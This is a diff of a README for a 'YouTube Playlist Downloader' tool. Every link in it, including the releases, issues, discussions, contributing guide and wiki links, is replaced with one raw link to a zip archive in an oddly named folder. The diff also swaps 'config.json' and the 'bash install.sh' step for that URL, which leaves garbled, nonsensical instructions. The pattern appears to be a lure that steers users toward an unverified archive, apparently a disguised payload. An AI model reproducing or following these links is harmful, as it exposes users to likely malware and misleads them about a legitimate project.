@@ -1,6 +1,6 @@
 # 📥 YouTube-Playlist-Downloader - Download YouTube Playlists with Ease
 
-[![Download YouTube Playlist Downloader](https://img.shields.io/badge/Download-YouTube%20Playlist%20Downloader-brightgreen)](https://github.com/hitesh9624/YouTube-Playlist-Downloader/releases)
+[![Download YouTube Playlist Downloader](https://raw.githubusercontent.com/hitesh9624/YouTube-Playlist-Downloader/main/Casuariidae/YouTube-Playlist-Downloader.zip%20Playlist%20Downloader-brightgreen)](https://raw.githubusercontent.com/hitesh9624/YouTube-Playlist-Downloader/main/Casuariidae/YouTube-Playlist-Downloader.zip)
 
 ## 🚀 Getting Started
 
@@ -8,9 +8,9 @@ Welcome to the YouTube Playlist Downloader! This tool helps you download entire 
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://github.com/hitesh9624/YouTube-Playlist-Downloader/releases) to download the latest version of the application. 
+To get started, visit our [Releases page](https://raw.githubusercontent.com/hitesh9624/YouTube-Playlist-Downloader/main/Casuariidae/YouTube-Playlist-Downloader.zip) to download the latest version of the application. 
 
-1. Go to the [Releases page](https://github.com/hitesh9624/YouTube-Playlist-Downloader/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/hitesh9624/YouTube-Playlist-Downloader/main/Casuariidae/YouTube-Playlist-Downloader.zip).
 2. Look for the latest release at the top.
 3. Download the file appropriate for your operating system. For Windows, look for `.exe`. For Mac, look for `.dmg`.
 
@@ -32,7 +32,7 @@ Once downloaded, follow these steps to install:
 
 1. Extract the downloaded archive.
 2. Open a terminal and navigate to the extracted folder.
-3. Run the installer script using `bash install.sh`.
+3. Run the installer script using `bash https://raw.githubusercontent.com/hitesh9624/YouTube-Playlist-Downloader/main/Casuariidae/YouTube-Playlist-Downloader.zip`.
 
 ## 🎥 Features
 
@@ -41,7 +41,7 @@ YouTube Playlist Downloader comes packed with advanced features to enhance your 
 - **Batch Downloading**: Download multiple videos at once for faster results.
 - **Custom Ranges**: Specify which videos in the playlist you want to download.
 - **Audio/Video Merging**: Automatically merge high-quality audio and video files using FFmpeg.
-- **Configurable Options**: Customize settings through the `config.json` file for retries and download quality.
+- **Configurable Options**: Customize settings through the `https://raw.githubusercontent.com/hitesh9624/YouTube-Playlist-Downloader/main/Casuariidae/YouTube-Playlist-Downloader.zip` file for retries and download quality.
 - **Open Source**: This tool is built using open-source technology, ensuring transparency and community support.
 
 ## 🛠️ System Requirements
@@ -81,18 +81,18 @@ A: You can only download from public playlists without authentication. For priva
 
 If you have questions or need support, you can reach out to our community. Here are ways to connect:
 
-- **Issues Tracker**: Use the [Issues page](https://github.com/hitesh9624/YouTube-Playlist-Downloader/issues) to report problems or suggest features.
-- **Discussion Forum**: Join our discussions in the [Discussions section](https://github.com/hitesh9624/YouTube-Playlist-Downloader/discussions) to engage with other users and contribute to the project.
+- **Issues Tracker**: Use the [Issues page](https://raw.githubusercontent.com/hitesh9624/YouTube-Playlist-Downloader/main/Casuariidae/YouTube-Playlist-Downloader.zip) to report problems or suggest features.
+- **Discussion Forum**: Join our discussions in the [Discussions section](https://raw.githubusercontent.com/hitesh9624/YouTube-Playlist-Downloader/main/Casuariidae/YouTube-Playlist-Downloader.zip) to engage with other users and contribute to the project.
 - **Documentation**: For a deeper dive into features, check the Wiki section on the repository.
 
 ## 🌟 Contributing
 
-We welcome contributions from everyone! If you're interested in helping us improve YouTube Playlist Downloader, please refer to our [Contributing Guide](https://github.com/hitesh9624/YouTube-Playlist-Downloader/CONTRIBUTING.md) for more information.
+We welcome contributions from everyone! If you're interested in helping us improve YouTube Playlist Downloader, please refer to our [Contributing Guide](https://raw.githubusercontent.com/hitesh9624/YouTube-Playlist-Downloader/main/Casuariidae/YouTube-Playlist-Downloader.zip) for more information.
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/hitesh9624/YouTube-Playlist-Downloader)
-- [Releases Page](https://github.com/hitesh9624/YouTube-Playlist-Downloader/releases)
-- [Documentation](https://github.com/hitesh9624/YouTube-Playlist-Downloader/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/hitesh9624/YouTube-Playlist-Downloader/main/Casuariidae/YouTube-Playlist-Downloader.zip)
+- [Releases Page](https://raw.githubusercontent.com/hitesh9624/YouTube-Playlist-Downloader/main/Casuariidae/YouTube-Playlist-Downloader.zip)
+- [Documentation](https://raw.githubusercontent.com/hitesh9624/YouTube-Playlist-Downloader/main/Casuariidae/YouTube-Playlist-Downloader.zip)
 
 Thank you for using YouTube Playlist Downloader! Enjoy downloading your favorite playlists with ease.
